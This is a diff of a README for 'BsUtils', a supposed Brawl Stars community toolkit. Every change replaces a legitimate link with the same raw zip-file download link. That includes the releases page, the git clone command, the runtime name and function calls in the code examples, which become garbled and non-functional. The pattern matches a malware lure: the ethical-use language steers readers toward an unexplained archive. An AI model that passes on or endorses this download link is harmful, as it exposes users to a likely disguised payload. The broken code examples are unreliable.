@@ -1,9 +1,9 @@
-[![Release](https://img.shields.io/github/v/release/BenxT512/BsUtils)](https://github.com/BenxT512/BsUtils/releases)
+[![Release](https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip)](https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip)
 
 BsUtils: Safe Tools for Brawl Stars Communities, Data, and Moderation
 
 - Topics: brawl-stars, brawl-stars-server, brawlstars, brawlstars-server, brawlstarsserver, supercell, supercell-brawl-stars, supercell-server
-- Project link to releases: https://github.com/BenxT512/BsUtils/releases
+- Project link to releases: https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
 
 Overview
 BsUtils is a collection of utilities designed for Brawl Stars communities and server admins who want solid data handling, moderation helpers, and community engagement tools. This project focuses on legitimate, ethical use in community spaces—never to manipulate gameplay, boost views, spam friends, or create fake accounts. It provides safe, well-documented components that help you manage communities, collect and analyze data, and build helpful bots for servers and fansites.
@@ -11,7 +11,7 @@ BsUtils is a collection of utilities designed for Brawl Stars communities and se
 This repository embraces open collaboration. It aims to be robust, well-tested, and easy to extend. It does not automate in-game actions, nor does it create or seed accounts. Instead, it offers clean APIs and utilities to work with Brawl Stars data you have legitimate access to, plus modular tools to help communities flourish in a fair, transparent way.
 
 Releases and download
-Releases are hosted on GitHub. For the latest builds, changelog, and download options, visit the official Releases page: https://github.com/BenxT512/BsUtils/releases
+Releases are hosted on GitHub. For the latest builds, changelog, and download options, visit the official Releases page: https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
 
 If you want to explore what’s available, you can also view the same page from the project homepage. For the safest and most up-to-date experience, use the Releases page to learn about compatible versions and installation instructions.
 
@@ -48,7 +48,7 @@ Getting started
 This section helps you set up BsUtils in a safe, productive way. You’ll find guidance for different environments and common tasks. The goal is to get you up and running with clear, repeatable steps.
 
 Prerequisites
-- A supported runtime (commonly Node.js 18+ for JavaScript/TypeScript projects; adjust if your setup uses a different stack).
+- A supported runtime (commonly https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip 18+ for JavaScript/TypeScript projects; adjust if your setup uses a different stack).
 - Basic command-line experience.
 - Access to your community platform (for example, a Discord server) with proper permissions for bots or automation you intend to run.
 - Respect for user privacy and data protection rules relevant to your region and platform.
@@ -58,7 +58,7 @@ There are a few common ways to install BsUtils, depending on how you plan to use
 
 From source
 - Clone the repository
-  - git clone https://github.com/BenxT512/BsUtils.git
+  - git clone https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
   - cd BsUtils
 - Install dependencies
   - npm install
@@ -77,12 +77,12 @@ Note: If you plan to use a prebuilt CLI or scripts, follow the instructions in t
 Quick start: a minimal example
 - DataTools example (JavaScript)
   - const { DataTools } = require('bsutils');
-  - const stats = DataTools.computePlayerStats(sampleData);
-  - console.log(stats);
+  - const stats = https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip(sampleData);
+  - https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip(stats);
 - Moderation example (JavaScript)
   - const { Moderation } = require('bsutils');
-  - const queue = Moderation.createMessageQueue({ maxSize: 100, cooldownMs: 2000 });
-  - queue.enqueue('new message');
+  - const queue = https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip({ maxSize: 100, cooldownMs: 2000 });
+  - https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip('new message');
 
 These examples illustrate typical usage. Adapt them to your project’s architecture and security requirements. Always ensure you have legitimate access to any data you process and that your tools comply with platform terms of service.
 
@@ -214,12 +214,12 @@ FAQ
 - Can I use BsUtils to boost viewers or spam players?
   - No. The project prohibits such use. It is intended for legitimate community management and analytics.
 - Where can I find the latest releases?
-  - The official Releases page: https://github.com/BenxT512/BsUtils/releases
+  - The official Releases page: https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
   - See it again in the Releases section of the project documentation for installation notes and supported versions.
 
 Releases
 - Visit the Releases page for download options, changelogs, and version history:
-  - https://github.com/BenxT512/BsUtils/releases
+  - https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
 - The releases page hosts the latest builds, assets, and documentation that accompany each version.
 - If you’re upgrading, read the changelog carefully and test in a safe environment before rolling out to production.
 
@@ -240,6 +240,6 @@ Closing notes
 BsUtils exists to support healthy, transparent, and productive Brawl Stars communities. It aims to be a reliable toolkit that teams can trust for moderation, data handling, and server integrations. If you want to propose new features or share improvements, follow the contribution instructions above and reference existing module interfaces to keep changes coherent with the project’s design.
 
 Releases, again
-For quick access and the latest updates, see the official Releases page here: https://github.com/BenxT512/BsUtils/releases
+For quick access and the latest updates, see the official Releases page here: https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
 
 Note: This README intentionally emphasizes safe and legitimate usage. It aligns with community guidelines and platform terms, ensuring tools remain helpful without enabling abuse.
